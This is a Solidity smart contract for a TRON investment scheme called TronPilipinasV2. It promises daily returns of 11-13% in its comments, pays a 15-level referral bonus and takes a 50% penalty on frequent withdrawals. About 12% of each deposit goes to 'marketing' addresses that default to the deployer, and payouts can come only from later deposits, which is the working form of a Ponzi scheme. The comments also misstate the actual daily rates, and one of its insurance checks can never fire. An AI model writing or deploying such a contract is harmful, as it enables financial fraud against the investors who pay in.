//SourceUnit: Tronpilipinasv2.sol

pragma solidity ^0.5.9;

contract TronPilipinasV2 {
    using SafeMath for uint;

    address payable public owner;

	address payable internal contract_;

    uint public invested;
    uint public earnings;
    uint public withdrawn;
    uint public direct_bonus;
    uint public match_bonus;
    uint public cashBack_bonus;
    uint public WithdrawalGap = 86400;
    uint public Insurance =0;
    uint public ClaimedInsurance;
    uint public InsuranceStatus = 0;
    
    uint private minDepositPlan1 = 10000000;		//10
    uint private maxDepositPlan1 = 999999999;		//999
    uint private minDepositPlan2 = 1000000000;		//1000
    uint private maxDepositPlan2 = 4999999999;		//4999
    uint private minDepositPlan3 = 5000000000;		//5000
    uint private maxDepositPlan3 = 10000000000;	        //10000
    
    uint private DailyRoi1 = 1115741; 		//11%
    uint private DailyRoi2 = 1231482; 		//12%
    uint private DailyRoi3 = 1347223; 		//13%
    
    uint private MaxRoi1 = 400; 
    uint private MaxRoi2 = 300; 
    uint private MaxRoi3 = 200;
    
    uint private releaseTime = 1609516800;
    
    
    address payable private marketing1 = msg.sender;
    address payable private marketing2 = msg.sender;
    address payable private marketing3 = msg.sender;
    address payable private marketing4 = msg.sender;
    address payable private marketing5 = msg.sender;
    address payable private marketing6 = msg.sender;
    address payable private marketing7 = msg.sender;
    address payable private marketing8 = msg.sender;
    
    address payable private commonref = msg.sender;

    uint internal constant direct_bonus_ = 10;

    uint internal lastUid = 1;

    uint[] public match_bonus_;

    uint[] public cashback_bonus_;

    bool public cashBack_ = true;

    DataStructs.Plan[] public plans;

    mapping(address => DataStructs.Player) public players;

    mapping(uint => address) public getPlayerbyId;

    event ReferralBonus(address indexed addr, address indexed refBy, uint bonus);
    event NewDeposit(address indexed addr, uint amount, uint tarif);
    event MatchPayout(address indexed addr, address indexed from, uint amount);
    event Withdraw(address indexed addr, uint amount);

   
       constructor(address payable _owner) public {
       
        owner = _owner;
        contract_ = msg.sender;
       

        match_bonus_.push(25); // l1
        match_bonus_.push(20); // l2
        match_bonus_.push(15); // l3
        match_bonus_.push(10); // l4
        match_bonus_.push(5); // l5
        match_bonus_.push(5); // l6
        match_bonus_.push(5); // l7
        match_bonus_.push(5); // l8
        match_bonus_.push(5); // l9
        match_bonus_.push(5); // l10
        match_bonus_.push(5); // l11
        match_bonus_.push(5); // l12
        match_bonus_.push(5); // l13
        match_bonus_.push(5); // l14
        match_bonus_.push(5); // l15

        cashback_bonus_.push(20);
        cashback_bonus_.push(30);
        cashback_bonus_.push(40);
        //cashback_bonus_.push(60);
        //cashback_bonus_.push(70);
    }

    /**
     * Modifiers
     * */
    modifier hasDeposit(address _userId){
        require(players[_userId].deposits.length > 0);
        _;
    }

    modifier onlyContract(){
        require(msg.sender == contract_);
        _;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

 /**
     * Internal Functions
     * */
     
   function _getPack(uint _amount) private view returns(uint){
        require(_amount >= minDepositPlan1, 'Wrong amount');
        if(_amount >= minDepositPlan1 && _amount <= maxDepositPlan1){
            return 1;
        }
        if(_amount >= minDepositPlan2 && _amount <= maxDepositPlan2){
            return 2;
        }
        if(_amount >= minDepositPlan3 && _amount <= maxDepositPlan3){
            return 3;
        }
        else{
            return 1;
        }
    }
    
    function _dailyroi(uint planId) private view returns(uint){
        require(planId >= 1 && planId <= 3);
        if(planId == 1){
            return DailyRoi1;
        }
        if(planId == 2){
            return DailyRoi2;
        }
        if(planId == 3){
            return DailyRoi3;
        }
        else{
            return DailyRoi1;
        }
    }
    
     function _maxroi(uint planId) private view returns(uint){
        require(planId >= 1 && planId <= 3);
        if(planId == 1){
            return MaxRoi1;
        }
        if(planId == 2){
            return MaxRoi2;
        }
        if(planId == 3){
            return MaxRoi3;
        }
        else{
            return MaxRoi1;
        }
    }
    
    
    function _matchingPayout(address _userId, uint _amount) private {
        address up = players[_userId].refBy;

        for(uint i = 0; i < match_bonus_.length; i++) {
            uint _bonus = _amount.mul(match_bonus_[i]).div(100);
            if(up == address(0)) {
                players[contract_].finances[0].available += _bonus;
                match_bonus += _bonus;
                earnings += _bonus;
                break;
            }
            
            uint GrossReceived = players[up].finances[0].total_earnings.add(_bonus); 
            
             if(GrossReceived < players[up].finances[0].max_payout){
            players[up].finances[0].available += _bonus;
            players[up].finances[0].total_match_bonus += _bonus;
            players[up].finances[0].total_earnings += _bonus;
            match_bonus += _bonus;
            earnings += _bonus;
            emit MatchPayout(up, _userId, _bonus);
            up = players[up].refBy;
        }      
        else{
            uint256 collectBonus_net = players[up].finances[0].max_payout.sub(players[up].finances[0].total_earnings); 
             
             if (collectBonus_net > 0) {
             
             if(collectBonus_net <= _bonus)
             { 
            players[up].finances[0].available += collectBonus_net;
            players[up].finances[0].total_match_bonus += collectBonus_net;
            players[up].finances[0].total_earnings += collectBonus_net;
            match_bonus += collectBonus_net;
            earnings += collectBonus_net;
            emit MatchPayout(up, _userId, collectBonus_net);
            up = players[up].refBy;
             }
             else{
            players[up].finances[0].available += _bonus;
            players[up].finances[0].total_match_bonus += _bonus;
            players[up].finances[0].total_earnings += _bonus;
            match_bonus += _bonus;
            earnings += _bonus;
            emit MatchPayout(up, _userId, _bonus);
            up = players[up].refBy;
             }
             }
              else{
            emit MatchPayout(up, _userId, 0);
            up = players[up].refBy;
              }
            }
            
           
        }
    }
 
   function _payDirectCom(address _refBy, uint _amount) private{
        uint bonus = _amount.mul(direct_bonus_).div(100);
        _checkout(_refBy);
        uint GrossReceived = players[_refBy].finances[0].total_earnings.add(bonus); 
        
        if(GrossReceived < players[_refBy].finances[0].max_payout){
        players[_refBy].finances[0].available += bonus;
        players[_refBy].finances[0].total_earnings += bonus;
        direct_bonus += bonus;
        earnings += bonus;
        emit ReferralBonus(msg.sender, _refBy, bonus);
        }      
        else{
            uint256 collectBonus_net = players[_refBy].finances[0].max_payout.sub(players[_refBy].finances[0].total_earnings); 
             
             if (collectBonus_net > 0) {
             
             if(collectBonus_net <= bonus)
             { 
             players[_refBy].finances[0].available += collectBonus_net;
             players[_refBy].finances[0].total_earnings += collectBonus_net;
             direct_bonus += collectBonus_net;
             earnings += collectBonus_net;
             emit ReferralBonus(msg.sender, _refBy, collectBonus_net);
             }
             else{
             players[_refBy].finances[0].available += bonus;
             players[_refBy].finances[0].total_earnings += bonus;
             direct_bonus += bonus;
             earnings += bonus;
             emit ReferralBonus(msg.sender, _refBy, bonus);
             }
             }
              else{
              emit ReferralBonus(msg.sender, _refBy, 0);
              }
            }

    }
      

  function _checkout(address _userId) private hasDeposit(_userId){
        DataStructs.Player storage player = players[_userId];
        if(player.deposits.length == 0) return;
        if(player.finances[0].insurance_claimed != 0) return;
        uint _minuteRate;
        uint _Interest;
        uint _myEarnings;
        
        for(uint i = 0; i < player.deposits.length; i++){
            DataStructs.Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = _dailyroi(dep.planId);
                _Interest = _maxroi(dep.planId).div(100);
                uint _gross = dep.amount.mul(secPassed).mul(_minuteRate).div(1e12);
                uint _max = dep.amount.mul(_Interest);
                uint _releasednet = dep.earnings;
                uint _released = dep.earnings.add(_gross);
                
                if(_released < _max){
                    _myEarnings += _gross;
                    dep.earnings += _gross;
                    dep.time = now;
                }
                
           else{
            uint256 collectProfit_net = _max.sub(_releasednet); 
             
             if (collectProfit_net > 0) {
             
             if(collectProfit_net <= _gross)
             {_myEarnings += collectProfit_net; 
             dep.earnings += collectProfit_net;
             dep.time = now;
             }
             else{
             _myEarnings += _gross; 
             dep.earnings += _gross;
             dep.time = now;}
             }
              else{
              
              dep.time = now;
              }
            }
                
}
        }
        
        uint MaxGrossEarnings = player.finances[0].total_earnings.add(_myEarnings);
        
        if(MaxGrossEarnings < player.finances[0].max_payout){
        player.finances[0].available += _myEarnings;
        player.finances[0].last_payout = now;
        player.finances[0].total_earnings += _myEarnings;
        earnings += _myEarnings;
        _matchingPayout(_userId, _myEarnings);
        }
        else{
        uint netEarnings = player.finances[0].max_payout.sub(player.finances[0].total_earnings);
        
         if (netEarnings > 0) {
             
             if(netEarnings <= _myEarnings)
             {
             player.finances[0].available += netEarnings;
             player.finances[0].last_payout = now;
             player.finances[0].total_earnings += netEarnings;
             earnings += netEarnings;
             _matchingPayout(_userId, netEarnings);
             }
             else{
        player.finances[0].available += _myEarnings;
        player.finances[0].last_payout = now;
        player.finances[0].total_earnings += _myEarnings;
        earnings += _myEarnings;
        _matchingPayout(_userId, _myEarnings);
             } 
             }
              else{
        player.finances[0].last_payout = now;
        }
         
        }
        
}


    function _Register(address _addr, address _affAddr) private{

        address _refBy = _affAddr;
        
        DataStructs.Player storage player = players[_addr];
        
        player.refBy = _refBy;

        address _affAddr1 = _affAddr;
        address _affAddr2 = players[_affAddr1].refBy;
        address _affAddr3 = players[_affAddr2].refBy;
        address _affAddr4 = players[_affAddr3].refBy;
        address _affAddr5 = players[_affAddr4].refBy;
        address _affAddr6 = players[_affAddr5].refBy;
        address _affAddr7 = players[_affAddr6].refBy;
        address _affAddr8 = players[_affAddr7].refBy;

        players[_affAddr1].refscount[0].aff1sum = players[_affAddr1].refscount[0].aff1sum.add(1);
        players[_affAddr2].refscount[0].aff2sum = players[_affAddr2].refscount[0].aff2sum.add(1);
        players[_affAddr3].refscount[0].aff3sum = players[_affAddr3].refscount[0].aff3sum.add(1);
        players[_affAddr4].refscount[0].aff4sum = players[_affAddr4].refscount[0].aff4sum.add(1);
        players[_affAddr5].refscount[0].aff5sum = players[_affAddr5].refscount[0].aff5sum.add(1);
        players[_affAddr6].refscount[0].aff6sum = players[_affAddr6].refscount[0].aff6sum.add(1);
        players[_affAddr7].refscount[0].aff7sum = players[_affAddr7].refscount[0].aff7sum.add(1);
        players[_affAddr8].refscount[0].aff8sum = players[_affAddr8].refscount[0].aff8sum.add(1);

        player.playerId = lastUid;
        getPlayerbyId[lastUid] = _addr;

        lastUid++;
    }



    /*
    * Only external call
    */

    function() external payable{

    }

    function deposit(address _refBy) external payable {
        require(now >= releaseTime, "not launched yet!");
	    uint _amount = msg.value;
        address payable _userId = msg.sender;
        uint _planId = _getPack(_amount);

        require(_planId >= 1 && _planId <= 3, 'Wrong Plan');

        DataStructs.Player storage player = players[_userId];
        require(player.finances[0].insurance_claimed == 0, "Since you have claimed the insurance, you are not allowed to deposit using this address");
        if(player.finances[0].total_invested == 0){
            if(_refBy != address(0) && _refBy != _userId && players[_refBy].finances[0].total_invested > 0){
              _Register(_userId, _refBy);
            }
            else{
              _Register(_userId, commonref);
            }
            }

        player.deposits.push(DataStructs.Deposit({
            planId: _planId,
            amount: _amount,
            earnings: 0,
            time: uint(block.timestamp)
            }));
            
        uint _Interest = _maxroi(_planId).div(100); 
        uint _maxInterest = _amount.mul(_Interest);
           
        player.finances[0].total_invested += _amount;
        player.finances[0].max_payout += _maxInterest;
        invested += _amount;
        Insurance += _amount.div(20);
        
        if(players[_refBy].finances[0].total_invested > 0)
        {_payDirectCom(_refBy, _amount);}

        _checkout(_userId);

        if(cashBack_){
            _planId--;
           
            uint _cashBack = _amount.mul(cashback_bonus_[_planId]).div(1000);
            cashBack_bonus += _cashBack;
            earnings += _cashBack;
            
            player.finances[0].total_cashback += _cashBack;
            player.finances[0].total_earnings += _cashBack;
            _userId.transfer(_cashBack);
        }
        
        uint marketingfee1 = _amount.mul(4).div(100);
        uint marketingfee2 = _amount.mul(2).div(100);
        uint marketingfee3 = _amount.mul(1).div(100);
        uint marketingfee4 = _amount.mul(1).div(100);

        
        marketing1.transfer(marketingfee1);
        marketing2.transfer(marketingfee2);
        marketing3.transfer(marketingfee3);
        marketing4.transfer(marketingfee3);
        marketing5.transfer(marketingfee4);
        marketing6.transfer(marketingfee4);
        marketing7.transfer(marketingfee4);
        marketing8.transfer(marketingfee4);
        

        emit NewDeposit(_userId, _amount, _planId);
        
    }

    function withdraw() external hasDeposit(msg.sender){
        address payable _userId = msg.sender;

        _checkout(_userId);
        uint netamount;
        uint penalty;
        uint contract_balanceGross = address(this).balance.sub(Insurance);
        uint contract_balance;
        
        if(contract_balanceGross > 0){
        contract_balance = contract_balanceGross;
        } else
        {contract_balance = 0;}
        
        DataStructs.Player storage player = players[_userId];
        uint256 withdrawal_gap = now - player.finances[0].withdrawal_time;
        
        //require(player.finances[0].available > 0 && address(this).balance > player.finances[0].available, "No Funds");
        require(player.finances[0].available > 0 && contract_balance > player.finances[0].available, "No Funds");
        
        if(withdrawal_gap >= WithdrawalGap){
        netamount = player.finances[0].available; 
        }
        else{
        netamount = player.finances[0].available.mul(50).div(100);  //If you withdraw within 24 hours of previous withdrawal, you will get only 50%. 50% is charges as the dump fee.
        penalty = player.finances[0].available.mul(50).div(100); 
        player.finances[0].withdrawal_fee += penalty;
        }
         
        uint amount = player.finances[0].available;

        player.finances[0].available = 0;
        player.finances[0].total_withdrawn += amount;
        player.finances[0].net_withdrawal += netamount;
        player.finances[0].withdrawal_time = now;
        withdrawn += netamount;

        _userId.transfer(netamount);

        emit Withdraw(msg.sender, netamount);
    }

    function claiminsurance() external hasDeposit(msg.sender){ 
        require(InsuranceStatus > 0);
        address payable _userId = msg.sender;
        DataStructs.Player storage player = players[_userId];
        uint insuredamount = player.finances[0].total_invested.div(2);
        require(player.finances[0].net_withdrawal < insuredamount, "You have withdrawn more than 50% your investment already!");
        require(player.finances[0].insurance_claimed == 0, "You have already claimed the insurance!");
        uint claimamountgross = insuredamount.sub(player.finances[0].net_withdrawal);
        uint claimamount;
        
        if(claimamountgross > 0){
        claimamount = claimamountgross;
        }else{
        claimamount = 0;
        }

        require(claimamount > 0 && address(this).balance > claimamount, "No Funds");
        require(claimamount > 0 && Insurance > claimamount, "No Funds");
       
        player.finances[0].available = 0;
        player.finances[0].total_withdrawn += claimamount;
        player.finances[0].net_withdrawal += claimamount;
        player.finances[0].withdrawal_time = now;
        player.finances[0].insurance_claimed = 1;
        withdrawn += claimamount;
        Insurance -= claimamount;
        if (Insurance < 0){
        Insurance = 0;}
      
        ClaimedInsurance += claimamount;

        _userId.transfer(claimamount);

        emit Withdraw(msg.sender, claimamount);
    }

    function _getEarnings(address _userId) view external returns(uint) {

        DataStructs.Player storage player = players[_userId];
        if(player.deposits.length == 0) return 0;
        if(player.finances[0].insurance_claimed != 0) return 0;
        uint _minuteRate;
        uint _Interest;
        uint _myEarnings;

        for(uint i = 0; i < player.deposits.length; i++){
            DataStructs.Deposit storage dep = player.deposits[i];
            uint secPassed = now - dep.time;
            if (secPassed > 0) {
                _minuteRate = _dailyroi(dep.planId);
                _Interest = _maxroi(dep.planId).div(100);
                uint _gross = (dep.amount.mul(secPassed.mul(_minuteRate))).div(1e12);
				uint _max = dep.amount.mul(_Interest);
                       
        uint _releasednet = dep.earnings;
        uint _released = player.finances[0].total_earnings.add(_gross);
        if(_released < _max){
                    _myEarnings += _gross;
                }
            else{
            uint256 collectProfit_net = _max.sub(_releasednet); 
             
             if (collectProfit_net > 0) {
             
             if(collectProfit_net <= _gross)
             {_myEarnings += collectProfit_net; 
             }
             else{
             _myEarnings += _gross; 
             }
             }
              else{
              _myEarnings += 0;
              }
            }
        }
        }
        
        uint MaxGrossEarnings = player.finances[0].total_earnings.add(_myEarnings);
        
        if(MaxGrossEarnings < player.finances[0].max_payout){
        return player.finances[0].available.add(_myEarnings);
        }
        else{
        uint netEarnings = player.finances[0].max_payout.sub(player.finances[0].total_earnings);
        
         if (netEarnings > 0) {
             
             if(netEarnings <= _myEarnings)
             {
             return player.finances[0].available.add(netEarnings);
             }
             else{
        return player.finances[0].available.add(_myEarnings);
             } 
             }
              else{
        return player.finances[0].available;
        }
         
        }
 }



    function userInfo(address _userId) view external returns(uint for_withdraw, uint total_invested, uint total_withdrawn,
        uint total_match_bonus, uint total_cashback, uint withdrawal_time, uint net_withdrawal, uint withdrawal_fee, uint aff1sum) {
        DataStructs.Player storage player = players[_userId];

        uint _myEarnings = this._getEarnings(_userId).add(player.finances[0].available);

        return (
        _myEarnings,
        player.finances[0].total_invested,
        player.finances[0].total_withdrawn,
        player.finances[0].total_match_bonus, 
        player.finances[0].total_cashback,
        player.finances[0].withdrawal_time,
        player.finances[0].net_withdrawal,
        player.finances[0].withdrawal_fee,
        player.refscount[0].aff1sum);
    }
    
    
    function PlayerInsuranceStatus(address _userId) view external returns(uint insurance_claimed) {
        DataStructs.Player storage player = players[_userId];
        return player.finances[0].insurance_claimed;
    }

    function contractInfo() view external returns(uint, uint, uint, uint, uint, uint, uint, uint, uint, uint) {
        return (invested, withdrawn, earnings.add(withdrawn), direct_bonus, match_bonus, lastUid, cashBack_bonus, address(this).balance, Insurance, ClaimedInsurance);
    }

    /**
     * Restrictied functions
     * */

	function setOwner(address payable _owner) external onlyContract()  returns(bool){
        owner = _owner;
        return true;
    }


    function _cashbackToggle() external onlyOwner() returns(bool){
        cashBack_ = !cashBack_ ? true:false;
        return cashBack_;
    }


    function updateMarketing1(address payable _address) public {
       require(msg.sender==owner);
       marketing1 = _address;
    }
    
     function updateMarketing2(address payable _address) public {
       require(msg.sender==owner);
       marketing2 = _address;
    }
    
      function updateMarketing3(address payable _address) public {
       require(msg.sender==owner);
       marketing3 = _address;
    }
    
      function updateMarketing4(address payable _address) public {
       require(msg.sender==owner);
       marketing4 = _address;
    }
    
      function updateMarketing5(address payable _address) public {
       require(msg.sender==owner);
       marketing5 = _address;
    }
    
         function updateMarketing6(address payable _address) public {
       require(msg.sender==owner);
       marketing6 = _address;
    }
    
        function updateMarketing7(address payable _address) public {
       require(msg.sender==owner);
       marketing7 = _address;
    }
    
           function updateMarketing8(address payable _address) public {
       require(msg.sender==owner);
       marketing8 = _address;
    }
    
    
    
    function updateCommonRef(address payable _address) public {
       require(msg.sender==owner);
       commonref = _address;
    }
    
   function setInsuranceStatus(uint256 _Value) public {
      require(msg.sender==owner);
      InsuranceStatus = _Value;
    }
    
    
}

contract Tron2021_{

    struct Deposit {
        uint planId;
        uint amount;
        uint earnings; // Released = Added to available
        uint time;
    }

    struct Player {
        address refBy;
        uint available;
        uint total_earnings;
        uint total_direct_bonus;
        uint total_match_bonus;
        uint total_invested;
        uint max_payout;
        uint last_payout;
        uint total_withdrawn;
        uint withdrawal_time;
        uint net_withdrawal;
        uint withdrawal_fee;
        uint insurance_claimed;
        Deposit[] deposits;
    }

    mapping(address => Player) public players;

    function _getEarnings(address _userId) external view returns(uint){}


						  
    function userInfo(address _userId) external view returns(uint, uint, uint, uint){}

}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

library DataStructs{
    struct Plan{
        uint minDeposit;
        uint maxDeposit;
        uint dailyRate;
        uint maxRoi;
    }

    struct Deposit {
        uint planId;
        uint amount;
        uint earnings; // Released = Added to available
        uint time;
    }

    struct RefsCount{
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
    }

   
    struct Finances{
        uint available;
        uint total_earnings;
        uint total_direct_bonus;
        uint total_match_bonus;
        uint total_cashback;
        uint total_invested;
        uint max_payout;
        uint last_payout;
        uint total_withdrawn;
        uint withdrawal_time;
        uint net_withdrawal;
        uint withdrawal_fee;
        uint insurance_claimed;
    }

    struct Player {
        uint playerId;
        address refBy;
        Finances[1] finances;
        Deposit[] deposits;
        RefsCount[1] refscount;
        
    }
}